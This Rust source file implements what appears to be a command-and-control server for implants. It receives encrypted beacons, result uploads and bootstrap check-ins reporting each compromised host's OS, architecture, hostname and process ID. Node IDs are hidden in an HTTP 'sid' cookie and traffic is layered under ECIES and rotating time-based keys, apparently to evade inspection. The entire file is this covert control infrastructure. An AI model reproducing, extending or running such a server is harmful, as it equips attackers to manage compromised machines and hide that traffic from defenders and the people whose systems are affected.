use std::collections::HashMap;
use std::io::Read;
use std::sync::Mutex;

use base64::engine::general_purpose::URL_SAFE_NO_PAD as BASE64;
use base64::Engine;

use glimmer::crypto::{self, TimeBasedKey};
use glimmer::keystore::KeyStore;
use glimmer::proto::{Envelope, MsgType};

struct Server {
    keystore: KeyStore,
    nodes: Mutex<HashMap<String, TimeBasedKey>>,
}

impl Server {
    fn new() -> Self {
        let keystore = KeyStore::load("keys").expect("failed to load keystore");
        Server {
            keystore,
            nodes: Mutex::new(HashMap::new()),
        }
    }
}

fn main() {
    let addr = std::env::args()
        .nth(1)
        .unwrap_or_else(|| "0.0.0.0:8080".into());

    let server = std::sync::Arc::new(Server::new());

    let listener = std::net::TcpListener::bind(&addr).unwrap();
    eprintln!("[server] listening on {}", addr);

    for stream in listener.incoming() {
        let stream = match stream {
            Ok(s) => s,
            Err(e) => {
                eprintln!("[error] accept: {}", e);
                continue;
            }
        };

        let server = server.clone();
        std::thread::spawn(move || {
            if let Err(e) = handle_connection(stream, &server) {
                eprintln!("[error] connection: {}", e);
            }
        });
    }
}

fn handle_connection(
    mut stream: std::net::TcpStream,
    server: &Server,
) -> Result<(), Box<dyn std::error::Error>> {
    let (_headers, body) = read_http_body(&mut stream)?;
    let body = body.trim();

    if body.len() < 8 {
        return Err("body too short".into());
    }

    let key_id_hex = &body[..8];
    let payload_b64 = &body[8..];

    let key_id_bytes: [u8; 4] = hex::decode(key_id_hex)?
        .try_into()
        .map_err(|_| "invalid key_id length")?;

    let decoded = BASE64.decode(payload_b64)?;

    let node_id_hint = extract_node_id(&_headers);

    // Look up server keypair by key_id
    let keypair = server
        .keystore
        .get(&key_id_bytes)
        .ok_or_else(|| format!("unknown key_id: {}", key_id_hex))?;

    // Try time-based + ECIES layered decryption for known nodes
    if let Some(ref nid) = node_id_hint {
        let nodes = server.nodes.lock().unwrap_or_else(|e| e.into_inner());
        if let Some(tbk) = nodes.get(nid.as_str()) {
            // Outer layer: time-based
            if let Ok(inner) = tbk.decrypt_with_skew(&decoded, 2) {
                // Inner layer: ECIES
                if let Ok(plaintext) = crypto::decrypt_from_beacon(&inner, keypair) {
                    let envelope = Envelope::unmarshal(&plaintext)?;
                    let ts = format_ts(envelope.timestamp);

                    match envelope.msg_type {
                        MsgType::Beacon => {
                            eprintln!(
                                "[beacon] {} node={} key_id={} [layered]",
                                ts, envelope.node_id, key_id_hex
                            );
                        }
                        MsgType::Result => {
                            eprintln!(
                                "[result] {} node={} payload={} bytes [layered]",
                                ts, envelope.node_id,
                                envelope.payload.as_ref().map(|p| p.len()).unwrap_or(0),
                            );
                        }
                        _ => {
                            eprintln!(
                                "[msg] {} node={} type={:?} [layered]",
                                ts, envelope.node_id, envelope.msg_type
                            );
                        }
                    }

                    let response = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
                    std::io::Write::write_all(&mut stream, response.as_bytes())?;
                    return Ok(());
                }
            }
        }
    }

    // Not a known node - try as bootstrap checkin
    let (plaintext, _response_pub, root_secret) =
        crypto::bootstrap_decrypt(&decoded, keypair)?;

    let envelope = Envelope::unmarshal(&plaintext)?;
    let ts = format_ts(envelope.timestamp);

    if let MsgType::Checkin = envelope.msg_type {
        if let Some(payload) = &envelope.payload {
            let checkin: glimmer::proto::CheckinData = serde_json::from_slice(payload)?;
            eprintln!(
                "[checkin] {} node={} os={}/{} host={} pid={} key_id={} [bootstrap]",
                ts,
                envelope.node_id,
                checkin.os,
                checkin.arch,
                checkin.host,
                checkin.pid,
                key_id_hex,
            );

            let tbk = TimeBasedKey::new(root_secret, 300);
            let mut nodes = server.nodes.lock().unwrap_or_else(|e| e.into_inner());
            nodes.insert(envelope.node_id.clone(), tbk);
            eprintln!("[server] time-based key established for node={}", envelope.node_id);
        }
    }

    let response = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
    std::io::Write::write_all(&mut stream, response.as_bytes())?;

    Ok(())
}

fn format_ts(timestamp: i64) -> String {
    chrono::DateTime::from_timestamp(timestamp, 0)
        .map(|t| t.format("%H:%M:%S").to_string())
        .unwrap_or_else(|| "???".into())
}

fn extract_node_id(headers: &str) -> Option<String> {
    headers
        .lines()
        .find(|line| line.to_lowercase().starts_with("cookie:"))
        .and_then(|line| {
            let cookies = line.splitn(2, ':').nth(1)?.trim();
            cookies
                .split(';')
                .map(|c| c.trim())
                .find(|c| c.starts_with("sid="))
                .map(|c| c.trim_start_matches("sid=").to_string())
        })
}

fn read_http_body(
    stream: &mut std::net::TcpStream,
) -> Result<(String, String), Box<dyn std::error::Error>> {
    let mut headers_buf = Vec::new();
    let mut byte = [0u8; 1];

    loop {
        stream.read_exact(&mut byte)?;
        headers_buf.push(byte[0]);

        if headers_buf.len() >= 4
            && &headers_buf[headers_buf.len() - 4..] == b"\r\n\r\n"
        {
            break;
        }

        if headers_buf.len() > 8192 {
            return Err("headers too large".into());
        }
    }

    let headers = String::from_utf8_lossy(&headers_buf).to_string();

    let content_length = headers
        .lines()
        .find(|line| line.to_lowercase().starts_with("content-length:"))
        .and_then(|line| line.split(':').nth(1))
        .and_then(|v| v.trim().parse::<usize>().ok())
        .unwrap_or(0);

    if content_length == 0 {
        return Err("no content-length".into());
    }

    if content_length > 1 << 20 {
        return Err("body too large".into());
    }

    let mut body = vec![0u8; content_length];
    stream.read_exact(&mut body)?;

    Ok((headers, String::from_utf8(body)?))
}